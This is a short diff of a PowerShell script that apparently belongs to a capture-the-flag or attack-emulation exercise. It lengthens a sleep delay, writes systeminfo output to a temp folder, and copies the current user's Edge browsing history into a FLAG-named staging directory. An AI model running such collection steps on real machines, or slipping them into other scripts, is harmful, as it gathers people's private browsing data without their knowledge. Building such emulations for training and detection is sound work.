@@ -1,4 +1,4 @@
-Start-Sleep -Seconds 10
+Start-Sleep -Seconds 100
 systeminfo > C:\Windows\Temp\FLAG099\FLAG024.txt
 $browsing_history_file_path = "C:\Users\" + $Env:UserName + "\AppData\Local\Microsoft\Edge\User Data\Default\History"
 cp $browsing_history_file_path C:\Windows\Temp\FLAG796
